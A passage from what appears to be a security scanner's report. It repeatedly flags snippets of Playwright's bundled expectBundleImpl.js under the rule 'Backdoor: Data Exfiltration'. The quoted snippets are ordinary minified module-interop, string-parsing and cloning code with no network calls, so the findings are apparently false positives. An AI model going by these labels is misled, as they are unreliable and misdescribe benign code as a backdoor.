                      "text": "?e:{default:e}}function nh(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(nh=function(n){return n?r:t})(e)}function sh(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=nh(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ih=global",
                      "markdown": "`?e:{default:e}}function nh(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(nh=function(n){return n?r:t})(e)}function sh(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=nh(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ih=global`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 265,
                  "startColumn": 2949,
                  "endLine": 265,
                  "endColumn": 2954,
                  "snippet": {
                    "text": "?e:{default:e}}function xp(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(xp=function(n){return n?r:t})(e)}function Pp(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=xp(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Dp=global",
                    "rendered": {
                      "text": "?e:{default:e}}function xp(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(xp=function(n){return n?r:t})(e)}function Pp(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=xp(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Dp=global",
                      "markdown": "`?e:{default:e}}function xp(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(xp=function(n){return n?r:t})(e)}function Pp(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=xp(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Dp=global`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 258,
                  "startColumn": 228,
                  "endLine": 258,
                  "endColumn": 233,
                  "snippet": {
                    "text": ")*)\\1$/,tb=/\\\\(u[a-f\\d]{4}|x[a-f\\d]{2}|.)|([^\\\\])/gi,rb=new Map([[\"n\",`\n`],[\"r\",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function d0(e){return e[0]===\"u\"&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):rb.get(e)||e}function nb(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n)if(!isNaN(i))r.push(Number(i));else if(s=i.match(eb))r.push(s[2].replace(tb,(u,o,a)=>o?d0(o):a));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`);return r}function sb(e){p0.lastIndex=0;",
                    "rendered": {
                      "text": ")*)\\1$/,tb=/\\\\(u[a-f\\d]{4}|x[a-f\\d]{2}|.)|([^\\\\])/gi,rb=new Map([[\"n\",`\n`],[\"r\",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function d0(e){return e[0]===\"u\"&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):rb.get(e)||e}function nb(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n)if(!isNaN(i))r.push(Number(i));else if(s=i.match(eb))r.push(s[2].replace(tb,(u,o,a)=>o?d0(o):a));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`);return r}function sb(e){p0.lastIndex=0;",
                      "markdown": "`)*)\\1$/,tb=/\\\\(u[a-f\\d]{4}|x[a-f\\d]{2}|.)|([^\\\\])/gi,rb=new Map([[\"n\",`\n`],[\"r\",\"\\r\"],[\"t\",\"\t\"],[\"b\",\"\\b\"],[\"f\",\"\\f\"],[\"v\",\"\\v\"],[\"0\",\"\\0\"],[\"\\\\\",\"\\\\\"],[\"e\",\"\\x1B\"],[\"a\",\"\\x07\"]]);function d0(e){return e[0]===\"u\"&&e.length===5||e[0]===\"x\"&&e.length===3?String.fromCharCode(parseInt(e.slice(1),16)):rb.get(e)||e}function nb(e,t){let r=[],n=t.trim().split(/\\s*,\\s*/g),s;for(let i of n)if(!isNaN(i))r.push(Number(i));else if(s=i.match(eb))r.push(s[2].replace(tb,(u,o,a)=>o?d0(o):a));else throw new Error(`Invalid Chalk template style argument: ${i} (in style '${e}')`);return r}function sb(e){p0.lastIndex=0;`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 31465,
                  "endLine": 48,
                  "endColumn": 31470,
                  "snippet": {
                    "text": "y=mu(),hf=rn();function gf(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(gf=function(n){return n?r:t})(e)}function Xy(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=gf(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Eu=global",
                    "rendered": {
                      "text": "y=mu(),hf=rn();function gf(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(gf=function(n){return n?r:t})(e)}function Xy(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=gf(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Eu=global",
                      "markdown": "`y=mu(),hf=rn();function gf(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(gf=function(n){return n?r:t})(e)}function Xy(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=gf(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Eu=global`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 28513,
                  "endLine": 48,
                  "endColumn": 28518,
                  "snippet": {
                    "text": "?e:{default:e}}function af(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(af=function(n){return n?r:t})(e)}function cf(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=af(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}});var rn=R(b",
                    "rendered": {
                      "text": "?e:{default:e}}function af(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(af=function(n){return n?r:t})(e)}function cf(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=af(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}});var rn=R(b",
                      "markdown": "`?e:{default:e}}function af(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(af=function(n){return n?r:t})(e)}function cf(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=af(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}});var rn=R(b`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 24404,
                  "endLine": 48,
                  "endColumn": 24409,
                  "snippet": {
                    "text": "{return e},e}var hy=Jl(Qi());function Jl(e){return e&&e.__esModule?e:{default:e}}var lu=new Map,dy={dot:!0};function gy(e){if(e.length===0)return()=>!1;let t=e.map(r=>{if(!lu.has(r)){let n=(0,Ql().default)(r,dy,!0),s={isMatch:n,negated:n.state.negated||!!n.state.negatedExtglob};lu.set(r,s)}return lu.get(r)});return r=>{let n=(0,hy.default)(r),s,i=0;for(let u=0;u<t.length;u++){let{isMatch:o,negated:a}=t[u];a&&i++;let l=o(n);!l&&a?s=!1:l&&!a&&(s=!0)}return i===t.length?s!==!1:!!s}}});var ef=R(pu=>{\"use strict\";Object.defineProperty(pu,\"__esModule\",{value:!0});pu.default=my;function my(e,t){return`${t",
                    "rendered": {
                      "text": "{return e},e}var hy=Jl(Qi());function Jl(e){return e&&e.__esModule?e:{default:e}}var lu=new Map,dy={dot:!0};function gy(e){if(e.length===0)return()=>!1;let t=e.map(r=>{if(!lu.has(r)){let n=(0,Ql().default)(r,dy,!0),s={isMatch:n,negated:n.state.negated||!!n.state.negatedExtglob};lu.set(r,s)}return lu.get(r)});return r=>{let n=(0,hy.default)(r),s,i=0;for(let u=0;u<t.length;u++){let{isMatch:o,negated:a}=t[u];a&&i++;let l=o(n);!l&&a?s=!1:l&&!a&&(s=!0)}return i===t.length?s!==!1:!!s}}});var ef=R(pu=>{\"use strict\";Object.defineProperty(pu,\"__esModule\",{value:!0});pu.default=my;function my(e,t){return`${t",
                      "markdown": "`{return e},e}var hy=Jl(Qi());function Jl(e){return e&&e.__esModule?e:{default:e}}var lu=new Map,dy={dot:!0};function gy(e){if(e.length===0)return()=>!1;let t=e.map(r=>{if(!lu.has(r)){let n=(0,Ql().default)(r,dy,!0),s={isMatch:n,negated:n.state.negated||!!n.state.negatedExtglob};lu.set(r,s)}return lu.get(r)});return r=>{let n=(0,hy.default)(r),s,i=0;for(let u=0;u<t.length;u++){let{isMatch:o,negated:a}=t[u];a&&i++;let l=o(n);!l&&a?s=!1:l&&!a&&(s=!0)}return i===t.length?s!==!1:!!s}}});var ef=R(pu=>{\"use strict\";Object.defineProperty(pu,\"__esModule\",{value:!0});pu.default=my;function my(e,t){return`${t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 727,
                  "endLine": 48,
                  "endColumn": 732,
                  "snippet": {
                    "text": "?e:{default:e}}function Al(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(Al=function(n){return n?r:t})(e)}function Sm(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=Al(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Am=Object",
                    "rendered": {
                      "text": "?e:{default:e}}function Al(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(Al=function(n){return n?r:t})(e)}function Sm(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=Al(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Am=Object",
                      "markdown": "`?e:{default:e}}function Al(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(Al=function(n){return n?r:t})(e)}function Sm(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=Al(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var Am=Object`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 5957,
                  "endLine": 46,
                  "endColumn": 5962,
                  "snippet": {
                    "text": "reStackTrace(this,r),Error.stackTraceLimit=s}};rs.default=ji});var ns=R(Hi=>{\"use strict\";Object.defineProperty(Hi,\"__esModule\",{value:!0});Hi.default=qi;var ki=new Set;function qi(e,t={blacklist:ki,keepPrototype:!1},r=new WeakMap){return typeof e!=\"object\"||e===null||Buffer.isBuffer(e)?e:r.has(e)?r.get(e):Array.isArray(e)?ym(e,t,r):mm(e,t,r)}function mm(e,t,r){let n=t.keepPrototype?Object.create(Object.getPrototypeOf(e)):{},s=Object.getOwnPropertyDescriptors(e);return r.set(e,n),Object.keys(s).forEach(i=>{if(t.blacklist&&t.blacklist.has(i)){delete s[i];return}let u=s[i];typeof u.value!=\"undefined\"",
                    "rendered": {
                      "text": "reStackTrace(this,r),Error.stackTraceLimit=s}};rs.default=ji});var ns=R(Hi=>{\"use strict\";Object.defineProperty(Hi,\"__esModule\",{value:!0});Hi.default=qi;var ki=new Set;function qi(e,t={blacklist:ki,keepPrototype:!1},r=new WeakMap){return typeof e!=\"object\"||e===null||Buffer.isBuffer(e)?e:r.has(e)?r.get(e):Array.isArray(e)?ym(e,t,r):mm(e,t,r)}function mm(e,t,r){let n=t.keepPrototype?Object.create(Object.getPrototypeOf(e)):{},s=Object.getOwnPropertyDescriptors(e);return r.set(e,n),Object.keys(s).forEach(i=>{if(t.blacklist&&t.blacklist.has(i)){delete s[i];return}let u=s[i];typeof u.value!=\"undefined\"",
                      "markdown": "`reStackTrace(this,r),Error.stackTraceLimit=s}};rs.default=ji});var ns=R(Hi=>{\"use strict\";Object.defineProperty(Hi,\"__esModule\",{value:!0});Hi.default=qi;var ki=new Set;function qi(e,t={blacklist:ki,keepPrototype:!1},r=new WeakMap){return typeof e!=\"object\"||e===null||Buffer.isBuffer(e)?e:r.has(e)?r.get(e):Array.isArray(e)?ym(e,t,r):mm(e,t,r)}function mm(e,t,r){let n=t.keepPrototype?Object.create(Object.getPrototypeOf(e)):{},s=Object.getOwnPropertyDescriptors(e);return r.set(e,n),Object.keys(s).forEach(i=>{if(t.blacklist&&t.blacklist.has(i)){delete s[i];return}let u=s[i];typeof u.value!=\"undefined\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 5012,
                  "endLine": 46,
                  "endColumn": 5017,
                  "snippet": {
                    "text": "(){return e},e}function bl(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(bl=function(n){return n?r:t})(e)}function dm(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=bl(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}function gm(e",
                    "rendered": {
                      "text": "(){return e},e}function bl(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(bl=function(n){return n?r:t})(e)}function dm(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=bl(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}function gm(e",
                      "markdown": "`(){return e},e}function bl(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(bl=function(n){return n?r:t})(e)}function dm(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=bl(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}function gm(e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 518,
                  "endLine": 41,
                  "endColumn": 523,
                  "snippet": {
                    "text": "),(0,qc.default)(t),r,n)}function Jc(e,t,r,n){if(!Vn.default.isReplaceable(e,t))return{replacedExpected:e,replacedReceived:t};if(r.includes(e)||n.includes(t))return{replacedExpected:e,replacedReceived:t};r.push(e),n.push(t);let s=new Vn.default(e),i=new Vn.default(t);return s.forEach((u,o)=>{let a=i.get(o);if(Kc(u))u.asymmetricMatch(a)&&i.set(o,u);else if(Kc(a))a.asymmetricMatch(u)&&s.set(o,a);else if(Vn.default.isReplaceable(u,a)){let l=Jc(u,a,r,n);s.set(o,l.replacedExpected),i.set(o,l.replacedReceived)}}),{replacedExpected:s.object,replacedReceived:i.object}}function Kc(e){return(0,zr.getType)(e)",
                    "rendered": {
                      "text": "),(0,qc.default)(t),r,n)}function Jc(e,t,r,n){if(!Vn.default.isReplaceable(e,t))return{replacedExpected:e,replacedReceived:t};if(r.includes(e)||n.includes(t))return{replacedExpected:e,replacedReceived:t};r.push(e),n.push(t);let s=new Vn.default(e),i=new Vn.default(t);return s.forEach((u,o)=>{let a=i.get(o);if(Kc(u))u.asymmetricMatch(a)&&i.set(o,u);else if(Kc(a))a.asymmetricMatch(u)&&s.set(o,a);else if(Vn.default.isReplaceable(u,a)){let l=Jc(u,a,r,n);s.set(o,l.replacedExpected),i.set(o,l.replacedReceived)}}),{replacedExpected:s.object,replacedReceived:i.object}}function Kc(e){return(0,zr.getType)(e)",
                      "markdown": "`),(0,qc.default)(t),r,n)}function Jc(e,t,r,n){if(!Vn.default.isReplaceable(e,t))return{replacedExpected:e,replacedReceived:t};if(r.includes(e)||n.includes(t))return{replacedExpected:e,replacedReceived:t};r.push(e),n.push(t);let s=new Vn.default(e),i=new Vn.default(t);return s.forEach((u,o)=>{let a=i.get(o);if(Kc(u))u.asymmetricMatch(a)&&i.set(o,u);else if(Kc(a))a.asymmetricMatch(u)&&s.set(o,a);else if(Vn.default.isReplaceable(u,a)){let l=Jc(u,a,r,n);s.set(o,l.replacedExpected),i.set(o,l.replacedReceived)}}),{replacedExpected:s.object,replacedReceived:i.object}}function Kc(e){return(0,zr.getType)(e)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 1261,
                  "endLine": 36,
                  "endColumn": 1266,
                  "snippet": {
                    "text": "y,Float64Array,Int16Array,Int32Array,Int8Array,Map,Set,RegExp,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray];typeof Buffer!=\"undefined\"&&jc.push(Buffer);var Sg=e=>jc.includes(e.constructor),Ag=e=>e.constructor===Map;function Kn(e,t=new WeakMap){return typeof e!=\"object\"||e===null?e:t.has(e)?t.get(e):Array.isArray(e)?wg(e,t):Ag(e)?Mg(e,t):Sg(e)?e:Og.plugins.DOMElement.test(e)?e.cloneNode(!0):Tg(e,t)}function Tg(e,t){let r=Object.create(Object.getPrototypeOf(e)),n=Object.getOwnPropertyDescriptors(e);t.set(e,r);let s=[...Object.keys(n),...Object.getOwnPropertySymbols(n)].reduce((i,u)=>{let o=n[",
                    "rendered": {
                      "text": "y,Float64Array,Int16Array,Int32Array,Int8Array,Map,Set,RegExp,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray];typeof Buffer!=\"undefined\"&&jc.push(Buffer);var Sg=e=>jc.includes(e.constructor),Ag=e=>e.constructor===Map;function Kn(e,t=new WeakMap){return typeof e!=\"object\"||e===null?e:t.has(e)?t.get(e):Array.isArray(e)?wg(e,t):Ag(e)?Mg(e,t):Sg(e)?e:Og.plugins.DOMElement.test(e)?e.cloneNode(!0):Tg(e,t)}function Tg(e,t){let r=Object.create(Object.getPrototypeOf(e)),n=Object.getOwnPropertyDescriptors(e);t.set(e,r);let s=[...Object.keys(n),...Object.getOwnPropertySymbols(n)].reduce((i,u)=>{let o=n[",
                      "markdown": "`y,Float64Array,Int16Array,Int32Array,Int8Array,Map,Set,RegExp,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray];typeof Buffer!=\"undefined\"&&jc.push(Buffer);var Sg=e=>jc.includes(e.constructor),Ag=e=>e.constructor===Map;function Kn(e,t=new WeakMap){return typeof e!=\"object\"||e===null?e:t.has(e)?t.get(e):Array.isArray(e)?wg(e,t):Ag(e)?Mg(e,t):Sg(e)?e:Og.plugins.DOMElement.test(e)?e.cloneNode(!0):Tg(e,t)}function Tg(e,t){let r=Object.create(Object.getPrototypeOf(e)),n=Object.getOwnPropertyDescriptors(e);t.set(e,r);let s=[...Object.keys(n),...Object.getOwnPropertySymbols(n)].reduce((i,u)=>{let o=n[`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 726,
                  "endLine": 36,
                  "endColumn": 731,
                  "snippet": {
